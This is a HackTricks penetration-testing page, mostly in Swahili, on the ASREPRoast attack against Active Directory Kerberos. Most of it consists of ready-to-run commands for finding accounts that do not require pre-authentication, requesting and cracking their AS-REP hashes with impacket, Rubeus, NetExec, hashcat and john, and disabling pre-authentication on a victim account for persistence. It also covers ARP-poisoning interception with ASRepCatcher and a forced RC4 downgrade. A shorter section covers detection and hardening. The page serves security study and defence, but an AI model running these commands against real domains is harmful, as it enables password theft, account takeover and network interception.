# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ni security attack inayotumia users wasio na **Kerberos pre-authentication required attribute**. Kimsingi, vulnerability hii huwawezesha attackers kuomba authentication ya user kutoka kwa Domain Controller (DC) bila kuhitaji password ya user. Kisha DC hujibu kwa message iliyosimbwa kwa encryption kwa kutumia key inayotokana na password ya user, ambayo attackers wanaweza kujaribu ku-crack offline ili kugundua password ya user.

Mahitaji makuu ya attack hii ni:

- **Lack of Kerberos pre-authentication**: Target users hawapaswi kuwa na security feature hii iliyowashwa.
- **Connection to the Domain Controller (DC)**: Attackers wanahitaji access kwa DC ili kutuma requests na kupokea messages zilizosimbwa kwa encryption.
- **Optional domain account**: Kuwa na domain account huwawezesha attackers kutambua kwa ufanisi zaidi users walio vulnerable kupitia LDAP queries. Bila account hiyo, attackers lazima wakisie usernames.

#### Kuhesabu users walio vulnerable (inahitaji domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Omba ujumbe wa AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus huomba **RC4** kwa default, kwa hivyo Event ID **4768** kwa kawaida huonyesha **preauth type 0** na **ticket encryption type 0x17**. Ukiongeza **`/aes`** (au RC4 imezimwa kwa target), tarajia **AES etypes** badala yake.<sup>[[2]](#references)</sup>

#### Amri fupi za mstari mmoja (Linux)

- Orodhesha targets zinazowezekana kwanza (kwa mfano, kutoka kwenye build paths zilizovuja) ukitumia Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast orodha nzima ya usernames bila creds halali ukitumia NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Ikiwa una creds, iache NetExec i-query LDAP na iombe kila account inayoweza ku-roastiwa kwa niaba yako: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Ikiwa output inaanza na **`$krb5asrep$23$`**, ipasue kwa Hashcat **`-m 18200`**. Ikiwa inaanza na **`$krb5asrep$17$`** au **`$krb5asrep$18$`**, pendelea John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Usidhani kwamba kila AS-REP roast ni RC4. Tooling ya kisasa inaweza kurudisha **RC4** (`$krb5asrep$23$`) au **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) kulingana na enctype iliyoombwa/iliyo-negotiatiwa. **`hashcat -m 18200`** ni ya **etype 23**, huku **John** ikishughulikia `krb5asrep` moja kwa moja kwa **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Force **preauth** si required kwa user ambaye una **GenericAll** permissions (au permissions za kuandika properties):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Utambuzi na uimarishaji

roast iliyofanikiwa hutoa tukio la **4768** kwenye DC lenye `Status=0x0` na `PreAuthType=0`. Usihitaji RC4 katika detection: `TicketEncryptionType=0x17` ni ishara muhimu ya weak-encryption, lakini attacker anaweza kuomba AES (thamani za event-log `0x11`/`0x12`). Kwenye Windows Server 2016 na matoleo ya baadaye yenye cumulative update ya Januari 14, 2025 (au mpya zaidi), toleo la 2 la event 4768 pia huonyesha `ClientAdvertizedEncryptionTypes`, etypes zinazoungwa mkono na account/DC, pamoja na keys zinazopatikana.<sup>[[5]](#references)</sup>

Hunt ya kiutendaji huashiria client inayotangaza RC4 pekee huku account ikiwa na AES keys, kisha huunganisha milipuko ya maombi kutoka IP moja ya source kwenye users kadhaa wasiohitaji preauth. Weka baseline ya exceptions halali badala ya kutoa alert kwa kila event yenye `PreAuthType=0`.

Suluhisho la kudumu ni kuondoa **Do not require Kerberos preauthentication** kwenye kila user ambaye hahitaji kwa lazima, na kubadilisha passwords za accounts zilizo exposed. Ikiwa exception haiwezi kuondolewa, tumia password ndefu iliyotengenezwa randomly na privileges chache. Kuzima RC4 huongeza gharama ya cracking, lakini hakuondoi roastability kwa sababu majibu ya AES AS-REP bado yanaweza ku-crackiwa offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast bila credentials

Attacker aliye kwenye njia ya mawasiliano anaweza kukamata AS-REP inayorejeshwa wakati wa AS exchange ya kawaida yenye preauthentication, na kuandaa sehemu yake iliyosimbwa kwa ajili ya offline cracking. Tofauti na ASREPRoasting ya kawaida, hii haihitaji `DONT_REQ_PREAUTH`; hata hivyo, hutoa tu accounts ambazo Kerberos exchange yake imekamatwa kwa kweli. **ASRepCatcher** hupata position kwa one-way ARP poisoning kwa default, au inaweza kutumia traffic kutoka technique nyingine ya MitM kwa `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Ikiwa unataka trick inayohusiana isiyohitaji credentials ambayo hurejesha **service ticket** badala ya **TGT** kutoka kwa principal isiyohitaji preauth, angalia [Kerberoast](kerberoast.md).

Katika mode ya `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) hu-forward AS-REQs zilizokamatwa na kulazimisha **RC4** wakati pande zote mbili bado zinaruhusu. `listen` haibadilishi packets, hivyo hukamata enctype yoyote ambayo client na DC wamekubaliana. Weka scope ya poisoning kwa kutumia `-t`/`-tf` badala ya kugusa subnet nzima inapowezekana.<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Tukio la 4768: Tiketi ya uthibitishaji ya Kerberos iliombwa](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
